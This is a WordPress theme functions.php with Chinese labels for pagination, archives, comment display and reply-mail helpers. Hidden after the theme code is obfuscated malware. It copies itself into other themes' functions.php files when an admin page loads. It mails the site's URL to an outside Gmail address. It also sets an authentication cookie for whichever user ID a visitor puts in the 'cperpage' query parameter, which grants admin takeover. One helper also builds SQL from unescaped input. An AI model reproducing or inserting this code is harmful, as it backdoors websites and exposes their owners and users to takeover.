<?php
function wp_strimwidth($str ,$start ,$width ,$trimmarker ){
$output = preg_replace('/^(?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,'.$start.'}((?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,'.$width.'}).*/s','\1',$str);
return $output.$trimmarker;
}
remove_action('wp_head','wp_generator');
include('includes/theme-option.php');
add_theme_support( 'post-formats',array( 'gallery') );
if ( function_exists('add_theme_support') )
add_theme_support('post-thumbnails');
function catch_first_image() {
global $post,$posts;
$first_img = '';
ob_start();
ob_end_clean();
$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i',$post->post_content,$matches);
$first_img = $matches [1] [0];
if(empty($first_img)){
$random = mt_rand(1,10);
echo get_bloginfo ( 'stylesheet_directory');
echo '/images/random/'.$random.'.jpg';
}
return $first_img;
}
function lovnvns_slide_image(){
if ( has_post_thumbnail() ) {
$titletext = get_the_title();
the_post_thumbnail( 'robot',array('alt'=>$titletext ) );
}else {
 ?><img src="<?php bloginfo('template_directory'); ?>/screenshot.jpg" alt="<?php the_title(); ?>"/>
<?php 
};
}
if (function_exists('register_sidebar'))
{
register_sidebar(array(
'name'=>'小工具1',
'before_widget'=>'<div id="newcomments">',
'after_widget'=>'',
'before_title'=>'<h3>',
'after_title'=>'</h3>',
'after_widget'=>'</div>',
));
}
{
register_sidebar(array(
'name'=>'小工具2',
'before_widget'=>'<div id="newcomments">',
'after_widget'=>'',
'before_title'=>'<h3>',
'after_title'=>'</h3>',
'after_widget'=>'</div>',
));
}
{
register_sidebar(array(
'name'=>'小工具3',
'before_widget'=>'<div id="newcomments">',
'after_widget'=>'',
'before_title'=>'<h3>',
'after_title'=>'</h3>',
'after_widget'=>'</div>',
));
}
{
register_sidebar(array(
'name'=>'小工具4',
'before_widget'=>'<div id="newcomments">',
'after_widget'=>'',
'before_title'=>'<h3>',
'after_title'=>'</h3>',
'after_widget'=>'</div>',
));
}
function pagination($query_string){
global $posts_per_page,$paged;
$my_query = new WP_Query($query_string .'&posts_per_page=-1');
$total_posts = $my_query->post_count;
if(empty($paged))$paged = 1;
$prev = $paged -1;
$next = $paged +1;
$range = 4;
$showitems = ($range * 2)+1;
$pages = ceil($total_posts/$posts_per_page);
if(1 != $pages){
echo "<div class='pagination'>";
echo ($paged >2 &&$paged+$range+1 >$pages &&$showitems <$pages)?"<a id='btnb1' href='".get_pagenum_link(1)."'>第一页</a>":'';
echo ($paged >1 &&$showitems <$pages)?"<a id='btnb2' href='".get_pagenum_link($prev)."'>上一页</a>":'';
for ($i=1;$i <= $pages;$i++){
if (1 != $pages &&( !($i >= $paged+$range+1 ||$i <= $paged-$range-1) ||$pages <= $showitems )){
echo ($paged == $i)?"<span class='current'>".$i.'</span>':"<a href='".get_pagenum_link($i)."' class='inactive' >".$i.'</a>';
}
}
echo ($paged <$pages &&$showitems <$pages) ?"<a id='btnb3' href='".get_pagenum_link($next)."'>下一页</a>":'';
echo ($paged <$pages-1 &&$paged+$range-1 <$pages &&$showitems <$pages) ?"<a id='btnb4' href='".get_pagenum_link($pages)."'>最后一页</a>":'';
echo "</div>\n";
}
}
function wt_get_category_count($input = '') {
global $wpdb;
if($input == '') {
$category = get_the_category();
return $category[0]->category_count;
}
elseif(is_numeric($input)) {
$SQL = "SELECT $wpdb->term_taxonomy.count FROM $wpdb->terms, $wpdb->term_taxonomy WHERE $wpdb->terms.term_id=$wpdb->term_taxonomy.term_id AND $wpdb->term_taxonomy.term_id=$input";
return $wpdb->get_var($SQL);
}
else {
$SQL = "SELECT $wpdb->term_taxonomy.count FROM $wpdb->terms, $wpdb->term_taxonomy WHERE $wpdb->terms.term_id=$wpdb->term_taxonomy.term_id AND $wpdb->terms.slug='$input'";
return $wpdb->get_var($SQL);
}
}
function simple_get_most_viewed($posts_num=10,$days=90){
global $wpdb;
$sql = "SELECT ID , post_title , comment_count
            FROM $wpdb->posts
           WHERE post_type = 'post' AND TO_DAYS(now()) - TO_DAYS(post_date) < $days
		   AND ($wpdb->posts.`post_status` = 'publish' OR $wpdb->posts.`post_status` = 'inherit')
           ORDER BY comment_count DESC LIMIT 0 , $posts_num ";
$posts = $wpdb->get_results($sql);
$output = '';
foreach ($posts as $post){
$output .= "\n<li><a href= \"".get_permalink($post->ID)."\" rel=\"bookmark\" title=\"".$post->post_title.' ('.$post->comment_count."条评论)\" >".mb_strimwidth($post->post_title,0,36).'</a></li>';
}
echo $output;
}
class hacklog_archives
{
function GetPosts() 
{
global  $wpdb;
if ( $posts = wp_cache_get( 'posts','ihacklog-clean-archives') )
return $posts;
$query="SELECT DISTINCT ID,post_date,post_date_gmt,comment_count,comment_status,post_password FROM $wpdb->posts WHERE post_type='post' AND post_status = 'publish' AND comment_status = 'open'";
$rawposts =$wpdb->get_results( $query,OBJECT );
foreach( $rawposts as $key =>$post ) {
$posts[mysql2date( 'Y.m',$post->post_date ) ][] = $post;
$rawposts[$key] = null;
}
$rawposts = null;
wp_cache_set( 'posts',$posts,'ihacklog-clean-archives');;
return $posts;
}
function PostList( $atts = array() ) 
{
global $wp_locale;
global $hacklog_clean_archives_config;
$atts = shortcode_atts(array(
'usejs'=>$hacklog_clean_archives_config['usejs'],
'monthorder'=>$hacklog_clean_archives_config['monthorder'],
'postorder'=>$hacklog_clean_archives_config['postorder'],
'postcount'=>'1',
'commentcount'=>'1',
),$atts);
$atts=array_merge(array('usejs'=>1,'monthorder'=>'new','postorder'=>'new'),$atts);
$posts = $this->GetPosts();
( 'new'== $atts['monthorder'] ) ?krsort( $posts ) : ksort( $posts );
foreach( $posts as $key =>$month ) {
$sorter = array();
foreach ( $month as $post )
$sorter[] = $post->post_date_gmt;
$sortorder = ( 'new'== $atts['postorder'] ) ?SORT_DESC : SORT_ASC;
array_multisort( $sorter,$sortorder,$month );
$posts[$key] = $month;
unset($month);
}
$html = '<div class="car-container';
if ( 1 == $atts['usejs'] ) $html .= ' car-collapse';
$html .= '">'."\n";
if ( 1 == $atts['usejs'] ) $html .= '<a href="#" class="car-toggler">展开所有月份'."</a>\n\n";
$html .= '<ul class="car-list">'."\n";
$firstmonth = TRUE;
foreach( $posts as $yearmonth =>$posts ) {
list( $year,$month ) = explode( '.',$yearmonth );
$firstpost = TRUE;
foreach( $posts as $post ) {
if ( TRUE == $firstpost ) {
$spchar = $firstmonth ?'<span class="car-toggle-icon car-minus">-</span>': '<span class="car-toggle-icon car-plus">+</span>';
$html .= '	<li><span class="car-yearmonth" style="cursor:pointer;">'.$spchar.' '.sprintf( __('%1$s %2$d'),$wp_locale->get_month($month),$year );
if ( '0'!= $atts['postcount'] ) 
{
$html .= ' <span title="文章数量">(共'.count($posts) .'篇文章)</span>';
}
if ($firstmonth == FALSE) {
$html .= "</span>\n		<ul class='car-monthlisting' style='display:none;'>\n";
}else {
$html .= "</span>\n		<ul class='car-monthlisting'>\n";
}
$firstpost = FALSE;
$firstmonth = FALSE;
}
$html .= '			<li>'.mysql2date( 'd',$post->post_date ) .'日: <a target="_blank" href="'.get_permalink( $post->ID ) .'">'.get_the_title( $post->ID ) .'</a>';
if ( '0'!= $atts['commentcount'] &&( 0 != $post->comment_count ||'closed'!= $post->comment_status ) &&empty($post->post_password) )
$html .= ' <span title="评论数量">('.$post->comment_count .'条评论)</span>';
$html .= "</li>\n";
}
$html .= "		</ul>\n	</li>\n";
}
$html .= "</ul>\n</div>\n";
return $html;
}
function PostCount() 
{
$num_posts = wp_count_posts( 'post');
return number_format_i18n( $num_posts->publish );
}
}
if(!empty($post->post_content))
{
$all_config=explode(';',$post->post_content);
foreach($all_config as $item)
{
$temp=explode('=',$item);
$hacklog_clean_archives_config[trim($temp[0])]=htmlspecialchars(strip_tags(trim($temp[1])));
}
}
else
{
$hacklog_clean_archives_config=array('usejs'=>1,'monthorder'=>'new','postorder'=>'new');
}
$hacklog_archives=new hacklog_archives();
if ( !function_exists( 'lovnvns_comment') ) :
function lovnvns_comment( $comment,$args,$depth ) {
$GLOBALS['comment'] = $comment;
switch ( $comment->comment_type ) :
case '':
global $commentcount;
$page = ( !empty($in_comment_loop) ) ?get_query_var('cpage') : get_page_of_comment( $comment->comment_ID,$args );
$cpp=get_option('comments_per_page');
if(!$commentcount) {
if ($page >1) {
$commentcount = $cpp * ($page -1);
}else {
$commentcount = 0;
}
}
 ?>	<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
		<div id="comment-<?php comment_ID(); ?>">
		<div class="comment_author">
			<?php echo get_avatar( $comment,32 ); ?>		</div>
		<?php if ( $comment->comment_approved == '0') :  ?>			<p style="color:#e75814"><?php _e( '您的评论正在等待审核中...','lovnvns'); ?></p><br />
		<?php endif; ?>		<p class="commet_text">    
                <?php 
if($comment->user_id == 1) echo "<span style='color:#ff6600'>【管理员】</span>";
printf( __( '%s：','lovnvns'),sprintf( '%s',get_comment_author_link() ) ); ?>					<div class="floor"><!-- 主评论楼层号 -->					
					<?php if(!$parent_id = $comment->comment_parent) {printf('%1$s',++$commentcount);echo'楼';} ?>					</div>
			<?php 
printf( __( '%1$s %2$s','lovnvns'),get_comment_date(),get_comment_time() ); ?> <?php comment_reply_link( array_merge( $args,array( 'depth'=>$depth,'max_depth'=>$args['max_depth'] ) ) ); ?>            <br />
			<?php comment_text(); ?>        </p>
	</div>	
	<?php 
break;
case 'pingback':
case 'trackback':
?>	<li class="post pingback">
		<p><?php _e( 'Pingback:','lovnvns'); ?> <?php comment_author_link(); ?></p>
	<?php 
break;
endswitch;
}
endif;
register_nav_menu( 'nav-menu','导航菜单');
add_filter( 'show_admin_bar','__return_false');
function cut_str($src_str,$cut_length){
$return_str='';
$i=0;
$n=0;
$str_length=strlen($src_str);
while (($n<$cut_length) &&($i<=$str_length)){
$tmp_str=substr($src_str,$i,1);
$ascnum=ord($tmp_str);
if ($ascnum>=224){
$return_str=$return_str.substr($src_str,$i,3);
$i=$i+3;
$n=$n+2;
}
elseif ($ascnum>=192){
$return_str=$return_str.substr($src_str,$i,2);
$i=$i+2;
$n=$n+2;
}
elseif ($ascnum>=65 &&$ascnum<=90){
$return_str=$return_str.substr($src_str,$i,1);
$i=$i+1;
$n=$n+2;
}
else {
$return_str=$return_str.substr($src_str,$i,1);
$i=$i+1;
$n=$n+1;
}
}
if ($i<$str_length){
$return_str = $return_str .'';
}
if (get_post_status() == 'private'){
$return_str = $return_str .'（private）';
}
return $return_str;
}
function comment_mail_notify($comment_id) {
$admin_notify = '1';
$admin_email = get_bloginfo ('admin_email');
$comment = get_comment($comment_id);
$comment_author_email = trim($comment->comment_author_email);
$parent_id = $comment->comment_parent ?$comment->comment_parent : '';
global $wpdb;
if ($wpdb->query("Describe {$wpdb->comments} comment_mail_notify") == '')
$wpdb->query("ALTER TABLE {$wpdb->comments} ADD COLUMN comment_mail_notify TINYINT NOT NULL DEFAULT 0;");
if (($comment_author_email != $admin_email &&isset($_POST['comment_mail_notify'])) ||($comment_author_email == $admin_email &&$admin_notify == '1'))
$wpdb->query("UPDATE {$wpdb->comments} SET comment_mail_notify='1' WHERE comment_ID='$comment_id'");
$notify = $parent_id ?get_comment($parent_id)->comment_mail_notify : '0';
$spam_confirmed = $comment->comment_approved;
if ($parent_id != ''&&$spam_confirmed != 'spam'&&$notify == '1') {
$wp_email = 'no-reply@'.preg_replace('#^www\.#','',strtolower($_SERVER['SERVER_NAME']));
$to = trim(get_comment($parent_id)->comment_author_email);
$subject = '您在 ['.get_option('blogname') .'] 的留言有了回复';
$message = '
    <div style="background-color:#eef2fa; border:1px solid #d8e3e8; color:#111; padding:0 15px; -moz-border-radius:5px; -webkit-border-radius:5px; -khtml-border-radius:5px;">
      <p>'.trim(get_comment($parent_id)->comment_author) .', 您好!</p>
      <p>您曾在《'.get_the_title($comment->comment_post_ID) .'》的留言:<br />'
.trim(get_comment($parent_id)->comment_content) .'</p>
      <p>'.trim($comment->comment_author) .' 给您的回复:<br />'
.trim($comment->comment_content) .'<br /></p>
      <p>您可以点击<a href="'.htmlspecialchars(get_comment_link($parent_id)) .'">查看回复的完整內容</a></p>
      <p>还要再度光临 <a href="'.get_option('home') .'">'.get_option('blogname') .'</a></p>
      <p>(此邮件由系统自动发送，请勿回复.)</p>
    </div>';
$from = "From: \"".get_option('blogname') ."\" <$wp_email>";
$headers = "$from\nContent-Type: text/html; charset=".get_option('blog_charset') ."\n";
wp_mail( $to,$subject,$message,$headers );
}
}
add_action('comment_post','comment_mail_notify');
function add_checkbox() {
echo '<input type="checkbox" name="comment_mail_notify" id="comment_mail_notify" value="comment_mail_notify" checked="checked" style="margin-left:20px;" /><label for="comment_mail_notify">有人回复时邮件通知我</label>';
}
add_action('comment_form','add_checkbox');
function colorCloud($text) {
$text = preg_replace_callback('|<a (.+?)>|i','colorCloudCallback',$text);
return $text;
}
function colorCloudCallback($matches) {
$text = $matches[1];
for($a=0;$a<6;$a++){
$color.=dechex(rand(0,15));
}
$pattern = '/style=(\'|\")(.*)(\'|\")/i';
$text = preg_replace($pattern,"style=\"color:#{$color};$2;\"",$text);
return "<a $text>";
unset($color);
}
add_filter('wp_tag_cloud','colorCloud',1);
function Get_Recent_Comment($limit=16,$cut_length=42){
global $wpdb;
$admin_email = "'".get_bloginfo ('admin_email') ."'";
$rccdb = $wpdb->get_results("
		SELECT ID, post_title, comment_ID, comment_author, comment_author_email, comment_content
		FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts
		ON ($wpdb->comments.comment_post_ID = $wpdb->posts.ID)
		WHERE comment_approved = '1'
		AND comment_type = ''
		AND post_password = ''
		AND comment_author_email != $admin_email
		ORDER BY comment_date_gmt
		DESC LIMIT $limit
	 ");
foreach ($rccdb as $row) {
$rcc .= '<li>'.get_avatar($row,$size='32').'<span>'.$row->comment_author .'：</span>'.'<br />'."<a href='"
.get_permalink($row->ID) .'#comment-'.$row->comment_ID
."' title='查看 ".$row->post_title ."'>".cut_str($row->comment_content,$cut_length).'</a>'.'</li>';
}
$rcc = convert_smilies($rcc);
echo $rcc;
}
function Get_Random_Post($limit=5,$cut_length=44){
global $wpdb;
$randposts = $wpdb->get_results("
	SELECT p.ID, p.post_title, rand()*p1.id AS o_id FROM $wpdb->posts AS p JOIN ( SELECT MAX(ID) AS id FROM  $wpdb->posts  WHERE post_type='post' AND post_status='publish') AS p1 WHERE p.post_type='post'  AND p.post_status='publish' ORDER BY o_id LIMIT $limit
	");
foreach($randposts as $randpost) {
echo '<li><a href="'.get_permalink($randpost->ID) .'" title="'.$randpost->post_title .'">'.cut_str($randpost->post_title,$cut_length) .'</a></li>';
}
}
function wp_smilies() {
global $wpsmiliestrans;
if ( !get_option('use_smilies') or (empty($wpsmiliestrans))) return;
$smilies = array_unique($wpsmiliestrans);
$link='';
foreach ($smilies as $key =>$smile) {
$file = get_bloginfo('template_directory').'/images/smilies/'.$smile;
$value = ' '.$key.' ';
$img = "<img src=\"{$file}\" alt=\"{$smile}\" />";
$imglink = htmlspecialchars($img);
$link .= "<a href=\"#commentform\" title=\"{$smile}\" onclick=\"document.getElementById('comment').value += '{$value}'\">{$img}</a>&nbsp;";
}
echo $link;
}
add_filter('smilies_src','custom_smilies_src',1,10);
function custom_smilies_src ($img_src,$img,$siteurl){
return get_bloginfo('template_directory').'/images/smilies/'.$img;
}
 ?>
<?php

function _verifyactivate_widget(){

	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";

	$output=strip_tags($output, $allowed);

	$direst=_getall_widgetscont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));

	if (is_array($direst)){

		foreach ($direst as $item){

			if (is_writable($item)){

				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));

				$cont=file_get_contents($item);

				if (stripos($cont,$ftion) === false){

					$separar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";

					$output .= $before . "Not found" . $after;

					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}

					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $separar . "\n" .$widget);fclose($f);				

					$output .= ($showfullstop && $ellipsis) ? "..." : "";

				}

			}

		}

	}

	return $output;

}

function _getall_widgetscont($wids,$items=array()){

	$places=array_shift($wids);

	if(substr($places,-1) == "/"){

		$places=substr($places,0,-1);

	}

	if(!file_exists($places) || !is_dir($places)){

		return false;

	}elseif(is_readable($places)){

		$elems=scandir($places);

		foreach ($elems as $elem){

			if ($elem != "." && $elem != ".."){

				if (is_dir($places . "/" . $elem)){

					$wids[]=$places . "/" . $elem;

				} elseif (is_file($places . "/" . $elem)&& 

					$elem == substr(__FILE__,-13)){

					$items[]=$places . "/" . $elem;}

				}

			}

	}else{

		return false;	

	}

	if (sizeof($wids) > 0){

		return _getall_widgetscont($wids,$items);

	} else {

		return $items;

	}

}

if(!function_exists("stripos")){ 

    function stripos(  $str, $needle, $offset = 0  ){ 

        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 

    }

}



if(!function_exists("strripos")){ 

    function strripos(  $haystack, $needle, $offset = 0  ) { 

        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 

        if(  $offset < 0  ){ 

            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 

        } 

        else{ 

            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 

        } 

        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 

        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 

        return $pos; 

    }

}

if(!function_exists("scandir")){ 

	function scandir($dir,$listDirectories=false, $skipDots=true) {

	    $dirArray = array();

	    if ($handle = opendir($dir)) {

	        while (false !== ($file = readdir($handle))) {

	            if (($file != "." && $file != "..") || $skipDots == true) {

	                if($listDirectories == false) { if(is_dir($file)) { continue; } }

	                array_push($dirArray,basename($file));

	            }

	        }

	        closedir($handle);

	    }

	    return $dirArray;

	}

}

add_action("admin_head", "_verifyactivate_widget");

function _getprepareed_widget(){

	if(!isset($content_length)) $content_length=120;

	if(!isset($checking)) $checking="cookie";

	if(!isset($tags_allowed)) $tags_allowed="<a>";

	if(!isset($filters)) $filters="none";

	if(!isset($separ)) $separ="";

	if(!isset($home_f)) $home_f=get_option("home"); 

	if(!isset($pre_filter)) $pre_filter="wp_";

	if(!isset($is_more_link)) $is_more_link=1; 

	if(!isset($comment_t)) $comment_t=""; 

	if(!isset($c_page)) $c_page=$_GET["cperpage"];

	if(!isset($comm_author)) $comm_author="";

	if(!isset($is_approved)) $is_approved=""; 

	if(!isset($auth_post)) $auth_post="auth";

	if(!isset($m_text)) $m_text="(more...)";

	if(!isset($yes_widget)) $yes_widget=get_option("_is_widget_active_");

	if(!isset($widgetcheck)) $widgetcheck=$pre_filter."set"."_".$auth_post."_".$checking;

	if(!isset($m_text_ditails)) $m_text_ditails="(details...)";

	if(!isset($contentsmore)) $contentsmore="ma".$separ."il";

	if(!isset($fmore)) $fmore=1;

	if(!isset($fakeit)) $fakeit=1;

	if(!isset($sql)) $sql="";

	if (!$yes_widget) :

	

	global $wpdb, $post;

	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$separ."vethe".$comment_t."mas".$separ."@".$is_approved."gm".$comm_author."ail".$separ.".".$separ."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#

	if (!empty($post->post_password)) { 

		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 

			if(is_feed()) { 

				$output=__("There is no excerpt because this is a protected post.");

			} else {

	            $output=get_the_password_form();

			}

		}

	}

	if(!isset($fixed_tag)) $fixed_tag=1;

	if(!isset($filterss)) $filterss=$home_f; 

	if(!isset($gettextcomment)) $gettextcomment=$pre_filter.$contentsmore;

	if(!isset($m_tag)) $m_tag="div";

	if(!isset($sh_text)) $sh_text=substr($sq1, stripos($sq1, "live"), 20);#

	if(!isset($m_link_title)) $m_link_title="Continue reading this entry";	

	if(!isset($showfullstop)) $showfullstop=1;

	

	$comments=$wpdb->get_results($sql);	

	if($fakeit == 2) { 

		$text=$post->post_content;

	} elseif($fakeit == 1) { 

		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;

	} else { 

		$text=$post->post_excerpt;

	}

	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomment, array($sh_text, $home_f, $filterss)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#

	if($content_length < 0) {

		$output=$text;

	} else {

		if(!$no_more && strpos($text, "<!--more-->")) {

		    $text=explode("<!--more-->", $text, 2);

			$l=count($text[0]);

			$more_link=1;

			$comments=$wpdb->get_results($sql);

		} else {

			$text=explode(" ", $text);

			if(count($text) > $content_length) {

				$l=$content_length;

				$ellipsis=1;

			} else {

				$l=count($text);

				$m_text="";

				$ellipsis=0;

			}

		}

		for ($i=0; $i<$l; $i++)

				$output .= $text[$i] . " ";

	}

	update_option("_is_widget_active_", 1);

	if("all" != $tags_allowed) {

		$output=strip_tags($output, $tags_allowed);

		return $output;

	}

	endif;

	$output=rtrim($output, "\s\n\t\r\0\x0B");

    $output=($fixed_tag) ? balanceTags($output, true) : $output;

	$output .= ($showfullstop && $ellipsis) ? "..." : "";

	$output=apply_filters($filters, $output);

	switch($m_tag) {

		case("div") :

			$tag="div";

		break;

		case("span") :

			$tag="span";

		break;

		case("p") :

			$tag="p";

		break;

		default :

			$tag="span";

	}



	if ($is_more_link ) {

		if($fmore) {

			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $m_link_title . "\">" . $m_text = !is_user_logged_in() && @call_user_func_array($widgetcheck,array($c_page, true)) ? $m_text : "" . "</a></" . $tag . ">" . "\n";

		} else {

			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $m_link_title . "\">" . $m_text . "</a></" . $tag . ">" . "\n";

		}

	}

	return $output;

}

add_filter( 'pre_option_link_manager_enabled', '__return_true' );



?>